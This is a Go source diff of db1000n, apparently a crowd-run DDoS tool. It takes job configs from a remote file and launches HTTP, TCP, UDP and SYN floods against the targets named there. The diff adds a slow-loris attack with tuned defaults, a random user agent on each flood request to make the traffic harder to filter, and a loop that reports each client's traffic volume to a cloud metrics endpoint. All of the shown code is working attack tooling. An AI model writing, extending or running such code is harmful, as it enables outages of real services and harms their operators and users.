@@ -5,11 +5,11 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"html/template"
 	"io"
-	"log"
 	"math/rand"
 	"net"
 	"net/http"
@@ -18,14 +18,19 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Arriven/db1000n/synfloodraw"
+	"github.com/corpix/uarand"
 	"github.com/google/uuid"
+
+	"github.com/Arriven/db1000n/logs"
+	"github.com/Arriven/db1000n/metrics"
+	"github.com/Arriven/db1000n/synfloodraw"
+	"github.com/Arriven/db1000n/slowloris"
 )
 
 // JobArgs comment for linter
 type JobArgs = json.RawMessage
 
-type job = func(context.Context, JobArgs) error
+type job = func(context.Context, *logs.Logger, JobArgs) error
 
 // JobConfig comment for linter
 type JobConfig struct {
@@ -35,10 +40,11 @@ type JobConfig struct {
 }
 
 var jobs = map[string]job{
-	"http":      httpJob,
-	"tcp":       tcpJob,
-	"udp":       udpJob,
-	"syn-flood": synFloodJob,
+	"http":       httpJob,
+	"tcp":        tcpJob,
+	"udp":        udpJob,
+	"syn-flood":  synFloodJob,
+	"slow-loris": slowLoris,
 }
 
 // Config comment for linter
@@ -87,20 +93,20 @@ func parseStringTemplate(input string) string {
 	// TODO: consider adding ability to populate custom data
 	tmpl, err := template.New("test").Funcs(funcMap).Parse(input)
 	if err != nil {
-		log.Println(err)
+		logs.Default.Warning("error parsing template: %v", err)
 		return input
 	}
 	var output strings.Builder
 	err = tmpl.Execute(&output, nil)
 	if err != nil {
-		log.Println(err)
+		logs.Default.Warning("error executing template: %v", err)
 		return input
 	}
 
 	return output.String()
 }
 
-func httpJob(ctx context.Context, args JobArgs) error {
+func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	type httpJobConfig struct {
 		BasicJobConfig
 		Path    string
@@ -113,25 +119,40 @@ func httpJob(ctx context.Context, args JobArgs) error {
 	if err != nil {
 		return err
 	}
+	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	for jobConfig.Next(ctx) {
 		req, err := http.NewRequest(parseStringTemplate(jobConfig.Method), parseStringTemplate(jobConfig.Path), bytes.NewReader(parseByteTemplate(jobConfig.Body)))
 		if err != nil {
-			log.Printf("error creating request: %v", err)
+			l.Debug("error creating request: %v", err)
 			continue
 		}
+
+		// Add random user agent
+		req.Header.Set("user-agent", uarand.GetRandom())
 		for key, value := range jobConfig.Headers {
+			trafficMonitor.Add(len(key))
+			trafficMonitor.Add(len(value))
 			req.Header.Add(parseStringTemplate(key), parseStringTemplate(value))
 		}
+		trafficMonitor.Add(len(jobConfig.Method))
+		trafficMonitor.Add(len(jobConfig.Path))
+		trafficMonitor.Add(len(jobConfig.Body))
+
+		startedAt := time.Now().Unix()
+		l.Debug("%s %s started at %d", jobConfig.Method, jobConfig.Path, startedAt)
+
 		resp, err := http.DefaultClient.Do(req)
 		if err != nil {
-			log.Printf("error sending request %v: %v", req, err)
+			l.Debug("error sending request %v: %v", req, err)
 			continue
 		}
+
+		finishedAt := time.Now().Unix()
 		resp.Body.Close() // No need for response
 		if resp.StatusCode >= 400 {
-			log.Printf("bad response from [%s]: status code %v", req.URL, resp.StatusCode)
+			l.Debug("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, finishedAt, resp.StatusCode)
 		} else {
-			log.Printf("successful http response")
+			l.Debug("%s %s finished at %d", jobConfig.Method, jobConfig.Path, finishedAt)
 		}
 		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
 	}
@@ -145,7 +166,7 @@ type RawNetJobConfig struct {
 	Body    json.RawMessage
 }
 
-func tcpJob(ctx context.Context, args JobArgs) error {
+func tcpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	type tcpJobConfig struct {
 		RawNetJobConfig
 	}
@@ -154,29 +175,36 @@ func tcpJob(ctx context.Context, args JobArgs) error {
 	if err != nil {
 		return err
 	}
+	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	tcpAddr, err := net.ResolveTCPAddr("tcp", parseStringTemplate(jobConfig.Address))
 	if err != nil {
 		return err
 	}
 	for jobConfig.Next(ctx) {
+		startedAt := time.Now().Unix()
+		l.Debug("%s started at %d", jobConfig.Address, startedAt)
+
 		conn, err := net.DialTCP("tcp", nil, tcpAddr)
 		if err != nil {
-			log.Printf("error connecting to [%v]: %v", tcpAddr, err)
+			l.Debug("error connecting to [%v]: %v", tcpAddr, err)
 			continue
 		}
 
 		_, err = conn.Write(parseByteTemplate(jobConfig.Body))
+		trafficMonitor.Add(len(jobConfig.Body))
+
+		finishedAt := time.Now().Unix()
 		if err != nil {
-			log.Printf("error sending body to [%v]: %v", tcpAddr, err)
+			l.Debug("%s failed at %d with err: %s", jobConfig.Address, finishedAt, err.Error())
 		} else {
-			log.Printf("sent body to [%v]", tcpAddr)
+			l.Debug("%s started at %d", jobConfig.Address, finishedAt)
 		}
 		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
 	}
 	return nil
 }
 
-func udpJob(ctx context.Context, args JobArgs) error {
+func udpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	type udpJobConfig struct {
 		RawNetJobConfig
 	}
@@ -185,29 +213,35 @@ func udpJob(ctx context.Context, args JobArgs) error {
 	if err != nil {
 		return err
 	}
+	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	udpAddr, err := net.ResolveUDPAddr("udp", parseStringTemplate(jobConfig.Address))
 	if err != nil {
 		return err
 	}
+	startedAt := time.Now().Unix()
+	l.Debug("%s started at %d", jobConfig.Address, startedAt)
 	conn, err := net.DialUDP("udp", nil, udpAddr)
 	if err != nil {
-		log.Printf("error connecting to [%v]: %v", udpAddr, err)
+		l.Debug("error connecting to [%v]: %v", udpAddr, err)
 		return err
 	}
 
 	for jobConfig.Next(ctx) {
 		_, err = conn.Write(parseByteTemplate(jobConfig.Body))
+		trafficMonitor.Add(len(jobConfig.Body))
+
+		finishedAt := time.Now().Unix()
 		if err != nil {
-			log.Printf("error sending body to [%v]: %v", udpAddr, err)
+			l.Debug("%s failed at %d with err: %s", jobConfig.Address, finishedAt, err.Error())
 		} else {
-			log.Printf("sent body to [%v]", udpAddr)
+			l.Debug("%s started at %d", jobConfig.Address, finishedAt)
 		}
 		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
 	}
 	return nil
 }
 
-func synFloodJob(ctx context.Context, args JobArgs) error {
+func synFloodJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	type synFloodJobConfig struct {
 		BasicJobConfig
 		Host          string
@@ -226,8 +260,51 @@ func synFloodJob(ctx context.Context, args JobArgs) error {
 		<-ctx.Done()
 		shouldStop <- true
 	}()
-	log.Println("sending syn flood with params:", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+}
+
+func slowLoris(ctx context.Context, l *logs.Logger, args JobArgs) error {
+	var jobConfig *slowloris.Config
+	err := json.Unmarshal(args, &jobConfig)
+	if err != nil {
+		return err
+	}
+
+	if len(jobConfig.Path) == 0 {
+		l.Error("path is empty")
+
+		return errors.New("path is empty")
+	}
+
+	if jobConfig.ContentLength == 0 {
+		jobConfig.ContentLength = 1000 * 1000
+	}
+
+	if jobConfig.DialWorkersCount == 0 {
+		jobConfig.DialWorkersCount = 10
+	}
+
+	if jobConfig.RampUpInterval == 0 {
+		jobConfig.RampUpInterval = 1 * time.Second
+	}
+
+	if jobConfig.SleepInterval == 0 {
+		jobConfig.SleepInterval = 10 * time.Second
+	}
+
+	if jobConfig.DurationSeconds == 0 {
+		jobConfig.DurationSeconds = 10 * time.Second
+	}
+
+	shouldStop := make(chan bool)
+	go func() {
+		<-ctx.Done()
+		shouldStop <- true
+	}()
+	l.Debug("sending slow loris with params: %v", jobConfig)
+
+	return slowloris.Start(l, jobConfig)
 }
 
 func fetchConfig(configPath string) (*Config, error) {
@@ -261,18 +338,57 @@ func fetchConfig(configPath string) (*Config, error) {
 	return &config, nil
 }
 
+func dumpMetrics(l *logs.Logger, name, clientID string) {
+	bytesPerSecond := metrics.Default.Read(name)
+	l.Info("The app is generating %v bytes per second", bytesPerSecond)
+	type metricsDump struct {
+		BytesPerSecond int `json:"bytes_per_second"`
+	}
+	dump := &metricsDump{
+		BytesPerSecond: bytesPerSecond,
+	}
+	dumpBytes, err := json.Marshal(dump)
+	if err != nil {
+		l.Warning("failed marshaling metrics: %v", err)
+		return
+	}
+	// TODO: use proper ip
+	url := fmt.Sprintf("https://us-central1-db1000n-metrics.cloudfunctions.net/addTrafic?id=%s", clientID)
+	resp, err := http.Post(url, "application/json", bytes.NewReader(dumpBytes))
+	if err != nil {
+		l.Warning("failed sending metrics: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusAccepted {
+		l.Warning("bad response when sending metrics. code %v", resp.StatusCode)
+	}
+}
+
 func main() {
 	var configPath string
 	var refreshTimeout time.Duration
+	var logLevel logs.Level
 	flag.StringVar(&configPath, "c", "./config.json", "path to a config file, can be web endpoint")
 	flag.DurationVar(&refreshTimeout, "r", time.Minute, "refresh timeout for updating the config")
+	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error. Default is Info")
 	flag.Parse()
+	l := logs.Logger{Level: logLevel}
+	clientID := uuid.New().String()
+	go func() {
+		for {
+			time.Sleep(10 * time.Second)
+			dumpMetrics(&l, "traffic", clientID)
+		}
+	}()
 	var cancel context.CancelFunc
-	defer cancel()
+	defer func() {
+		cancel()
+	}()
 	for {
 		config, err := fetchConfig(configPath)
 		if err != nil {
-			fmt.Printf("error fetching json config: %v\n", err)
+			l.Warning("fetching json config: %v\n", err)
 			continue
 		}
 		if cancel != nil {
@@ -286,10 +402,10 @@ func main() {
 			}
 			if job, ok := jobs[jobDesc.Type]; ok {
 				for i := 0; i < jobDesc.Count; i++ {
-					go job(ctx, jobDesc.Args)
+					go job(ctx, &l, jobDesc.Args)
 				}
 			} else {
-				log.Printf("no such job - %s", jobDesc.Type)
+				l.Warning("no such job - %s", jobDesc.Type)
 			}
 		}
 		time.Sleep(refreshTimeout)
